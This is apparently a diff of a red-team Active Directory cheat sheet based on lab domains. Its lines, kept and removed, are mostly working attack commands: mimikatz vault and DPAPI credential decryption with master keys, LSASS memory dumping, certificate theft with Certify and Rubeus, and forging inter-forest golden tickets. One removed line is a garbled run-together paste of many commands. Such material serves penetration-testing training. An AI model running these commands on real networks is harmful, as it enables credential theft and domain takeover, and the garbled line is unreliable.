@@ -546,8 +546,6 @@ rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
 pypykatz.exe live lsa
 ```
 
-##### xxxxxxxxxx # Use mimikatz to dump secrets from windows vaultbeacon> mimikatz !vault::listbeacon> mimikatz !vault::cred /patch​# Part 1: Enumerate stored credentials, Make sure to enumerate as both Admin and Domain User in a machine.# 0. Check if system has credentials stored in either web or windows vaultbeacon> run vaultcmd /listbeacon> run vaultcmd /listcreds:"Windows Credentials" /allbeacon> run vaultcmd /listcreds:"Web Credentials" /allbeacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault​# Part 2.1: Scheduled Task Credentials# 0. Before manually trying to extract Credentials try below command ones which is equivalent of the below commands and gives same.beacon> mimikatz !vault::cred /patch# 1. Credentials for task scheduler are stored at below location in encrypted blobbeacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials# 2. Find the GUID (guidMasterKey) of Master key associated with encrypted blob (F31...B6E)beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F31...B6E# 3. Dump all the master keys and filter the one we need based on GUID identified in previous stepbeacon> mimikatz !sekurlsa::dpapi# 4. Use the Encrypted Blob and Master Key to decrypt and extract plain text passwordbeacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F31...B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9​# Part 2.2: Extracting stored RDP Password​# 0. Verify if any credentials are stored or notbeacon> run vaultcmd /listbeacon> run vaultcmd /listcreds:"Windows Credentials" /allbeacon> run vaultcmd /listcreds:"Web Credentials" /allbeacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault​# 1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles​# 2. Verify the credential blob in users cred directory (Note encrypted blob ID)beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials​# 3. Master keys are stored in the users' roaming "Protect" directory (Note GUID of master key matching with Seatbelt)beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104​# 4. Decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob. (Need to be execute in context of user who owns the key, use @ modifier)# Requires Elevation or interaction with LSASSbeacon> mimikatz !sekurlsa::dpapi# Does not requires elevation or interaction with LSASS (Check last lines with "domainkey with RPC" line)beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc​# 5. Use Master key to decrypt the credentials blobbeacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214powershell
-
 ```powershell
 # 6. Using comsvcs.dll
 tasklist /FI "IMAGENAME eq lsass.exe"
@@ -1296,13 +1294,7 @@ Write-Host ("Username: " + $username.Username)
 Write-Host ("Password: " + $password.Password)
 ```
 
-### AD CS
-
--   Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.
-    -   Used by organization for smart cards, SSL certificates, code signing, etc.
--   Clients send certificate signing requests (CSRs) to an (enterprise) CA, which signs issued certificates using the private key for the CA certificate
--   AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
--   "AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization."
+## AD CS
 
 ##### Using Rubeus to request for a certificate
 
@@ -1314,12 +1306,12 @@ Write-Host ("Password: " + $password.Password)
 Rubeus.exe asktgt /user:admin /certificate:C:\Temp\cert.pfx /password:password
 ```
 
-##### **"Passive"** Certificate Theft
+###### **"Passive"** Certificate Theft
 
 -   If hardware protection is not used, existing user/machine certificates are stored using DPAPI
     -   *Mimikatz* and *SharpDPAPI* can steal such certs/private keys
 
-##### **"Active"** Certificate Theft
+###### **"Active"** Certificate Theft
 
 -   Users/machines can enrol in any template they have Enrol permissions for
     -   By default the User and Machine templates are available
@@ -1332,15 +1324,6 @@ Rubeus.exe asktgt /user:admin /certificate:C:\Temp\cert.pfx /password:password
 # Certify
 Certify.exe request /ca:da.theshrine.local\theshrine-DC-CA /template:user
 ```
-
-##### Offensive Advantages
-
-1.  Doesn’t touch `lsass.exe`’s memory!
-2.  Doesn’t need elevation (for user contexts)!
-3.  Few existing detection methods! (*currently* lesser known technique)
-4.  Separate credential material from passwords
-    1.  Works even if an account changes its password!
-    2.  Long lifetime. By default, User/Machine templates issue certificates valid for 1 year.
 
 ### AD CS Abuse
 
@@ -1493,9 +1476,9 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 # 2. Forge the inter-forest TGT
-Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59...979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
 
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799...75a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
 
 # 3. Request a TGS [keko]
 # Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo
